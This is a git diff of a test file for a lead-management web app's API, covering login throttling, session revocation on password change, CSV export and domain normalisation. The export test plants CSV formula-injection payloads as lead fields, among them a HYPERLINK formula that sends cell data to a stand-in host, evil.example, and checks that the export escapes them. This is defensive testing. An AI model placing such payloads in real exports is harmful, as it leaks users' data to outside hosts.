@@ -1,8 +1,10 @@
+import { parse as parseCsv } from 'csv-parse/sync';
 import { describe, expect, it } from 'vitest';
 import { DAY } from '../src/clock.js';
 import { buildApp } from '../src/app.js';
 import { Engine } from '../src/engine/engine.js';
 import { csvToLeads } from '../src/routes/leads.js';
+import { csvCell } from '../src/http.js';
 import { makeWorld, runFor } from './helpers.js';
 
 async function setup() {
@@ -73,7 +75,7 @@ describe('HTTP API', () => {
     expect(analytics.body.replyRate).toBe(100);
 
     const exported = await call('GET', `/api/leads/export.csv?campaignId=${camp.body.id}`);
-    expect(String(exported.body).split('\n')[0]).toContain('favouriteTool');
+    expect(String(exported.body).split('\n')[0]).toContain('custom_favouriteTool');
     expect(String(exported.body)).toContain('connected');
   });
 
@@ -112,15 +114,96 @@ describe('HTTP API', () => {
     expect((await call('POST', '/api/auth/register', { ...base, setupToken: 's3cret-token' })).status).toBe(200);
   });
 
-  it('throttles repeated failed logins', async () => {
+  it('throttles repeated failed logins, counting them in the database so every instance sees them', async () => {
+    const { call, w } = await setup();
+    await call('POST', '/api/auth/register', { name: 'Ana', email: 'ana@example.com', password: 'correct-horse' });
+    for (let i = 0; i < 10; i++) expect((await call('POST', '/api/auth/login', { email: 'ANA@example.com', password: 'wrong' })).status).toBe(401);
+    expect(w.ctx.db.all('SELECT throttle_key, failures FROM login_failures')).toEqual([{ throttle_key: 'ana@example.com|127.0.0.1', failures: 10 }]);
+    expect((await call('POST', '/api/auth/login', { email: 'ana@example.com', password: 'correct-horse' })).status).toBe(429);
+    // A second app on the same database (another instance) is locked out too.
+    const other = await buildApp(w.ctx);
+    expect((await other.inject({ method: 'POST', url: '/api/auth/login', payload: { email: 'ana@example.com', password: 'correct-horse' } })).statusCode).toBe(429);
+    // The window ends: failures start again from one, and a success clears them.
+    w.ctx.db.run('UPDATE login_failures SET expires_at = ?', [Date.now() - 1]);
+    expect((await call('POST', '/api/auth/login', { email: 'ana@example.com', password: 'wrong' })).status).toBe(401);
+    expect(w.ctx.db.get('SELECT failures FROM login_failures')).toEqual({ failures: 1 });
+    expect((await call('POST', '/api/auth/login', { email: 'ana@example.com', password: 'correct-horse' })).status).toBe(200);
+    expect(w.ctx.db.get('SELECT COUNT(*) AS n FROM login_failures')).toEqual({ n: 0 });
+  });
+
+  it('signs out the other sessions when the password changes, keeping the current one', async () => {
+    const { app, call } = await setup();
+    await call('POST', '/api/auth/register', { name: 'Ana', email: 'ana@example.com', password: 'correct-horse' });
+    const login = await app.inject({ method: 'POST', url: '/api/auth/login', payload: { email: 'ana@example.com', password: 'correct-horse' } });
+    const elsewhere = String([login.headers['set-cookie']].flat()[0]).split(';')[0];
+    const me = (cookie?: string) => app.inject({ method: 'GET', url: '/api/auth/me', headers: cookie ? { cookie } : {} }).then((r) => r.statusCode);
+    expect(await me(elsewhere)).toBe(200);
+    expect((await call('POST', '/api/auth/password', { current: 'wrong-password', next: 'battery-staple' })).status).toBe(400);
+    expect(await me(elsewhere)).toBe(200);
+    expect((await call('POST', '/api/auth/password', { current: 'correct-horse', next: 'battery-staple' })).status).toBe(200);
+    expect(await me(elsewhere)).toBe(401);
+    expect((await call('GET', '/api/auth/me')).status).toBe(200);
+  });
+
+  it('exports CSV that spreadsheets read as text, with custom fields in their own columns', async () => {
     const { call } = await setup();
     await call('POST', '/api/auth/register', { name: 'Ana', email: 'ana@example.com', password: 'correct-horse' });
-    for (let i = 0; i < 10; i++) expect((await call('POST', '/api/auth/login', { email: 'ana@example.com', password: 'wrong' })).status).toBe(401);
-    expect((await call('POST', '/api/auth/login', { email: 'ana@example.com', password: 'correct-horse' })).status).toBe(429);
+    const list = await call('POST', '/api/lists', { name: 'L' });
+    const lead = await call('POST', '/api/leads', { listId: list.body.id, profileUrl: 'https://www.linkedin.com/in/evil/', email: 'real@acme.com' });
+    // A scraped headline is whatever the person typed into LinkedIn.
+    const patch = await call('PATCH', `/api/leads/${lead.body.id}`, {
+      firstName: '=HYPERLINK("http://evil.example/?x="&A2,"click")',
+      headline: '@SUM(1+1)',
+      company: '\t-2+3',
+      custom: { 'a,b': 'x', email: 'spoof@evil.example', '=cmd': '+1' },
+    });
+    expect(patch.status).toBe(200);
+    const exported = String((await call('GET', `/api/leads/export.csv?listId=${list.body.id}`)).body);
+    const [header, row] = exported.split('\n');
+    expect(header).toContain('email,');
+    expect(header).toContain('"custom_a,b",custom_email,custom_=cmd');
+    expect(row).toContain('"\'=HYPERLINK(""http://evil.example/?x=""&A2,""click"")"');
+    expect(row).toContain(",'@SUM(1+1),");
+    expect(row).toContain(",'\t-2+3,");
+    expect(row).toContain(',real@acme.com,');
+    expect(row).toContain(",x,spoof@evil.example,'+1");
+    // No cell starts with a formula character, and header and rows have the same number of columns.
+    const [head, cells] = parseCsv(exported) as string[][];
+    expect(cells).toHaveLength(head.length);
+    expect(cells.filter((c) => /^[=+\-@\t\r]/.test(c))).toEqual([]);
+    expect(csvCell('-5')).toBe("'-5");
+    expect(csvCell('\rx')).toBe(`"'\rx"`);
+    expect(csvCell('plain')).toBe('plain');
+
+    // Importing the export gives custom fields their names back.
+    const back = csvToLeads(exported);
+    expect(back[0].custom).toMatchObject({ email: 'spoof@evil.example', aB: 'x' });
+    expect(back[0].email).toBe('real@acme.com');
   });
 
   it('maps common CSV headers', () => {
     const rows = csvToLeads('﻿First Name,Last Name,Profile URL,Job Title,Email Address,Tags\nA,B,https://linkedin.com/in/ab,CEO,a@b.co,vip;warm\n');
     expect(rows[0]).toMatchObject({ firstName: 'A', lastName: 'B', title: 'CEO', email: 'a@b.co', tags: ['vip', 'warm'] });
+  });
+
+  it('imports and edits the company domain as a bare host', async () => {
+    expect(csvToLeads('Profile URL,Website\nhttps://linkedin.com/in/ab,https://www.Acme.com/about\n')[0].companyDomain).toBe('https://www.Acme.com/about');
+    expect(csvToLeads('Profile URL,company_domain\nhttps://linkedin.com/in/ab,acme.com\n')[0].companyDomain).toBe('acme.com');
+
+    const { call } = await setup();
+    await call('POST', '/api/auth/register', { name: 'Dee', email: 'dee@example.com', password: 'correct-horse' });
+    const list = await call('POST', '/api/lists', { name: 'D' });
+    const csv = 'Profile URL,First Name,Company Website\nhttps://www.linkedin.com/in/dom-a/,A,https://www.Acme.com/about\nhttps://www.linkedin.com/in/dom-b/,B,localhost\n';
+    expect((await call('POST', '/api/leads/import/csv', { listId: list.body.id, csv })).body).toMatchObject({ added: 2 });
+    const items = (await call('GET', `/api/leads?listId=${list.body.id}`)).body.items;
+    const a = items.find((l: any) => l.firstName === 'A');
+    expect(a.companyDomain).toBe('acme.com');
+    // Something that can't be a public website is dropped rather than stored.
+    expect(items.find((l: any) => l.firstName === 'B').companyDomain).toBeNull();
+
+    expect((await call('PATCH', `/api/leads/${a.id}`, { companyDomain: 'Initech.io' })).status).toBe(200);
+    expect((await call('GET', `/api/leads/${a.id}`)).body.companyDomain).toBe('initech.io');
+    await call('PATCH', `/api/leads/${a.id}`, { companyDomain: null });
+    expect((await call('GET', `/api/leads/${a.id}`)).body.companyDomain).toBeNull();
   });
 });
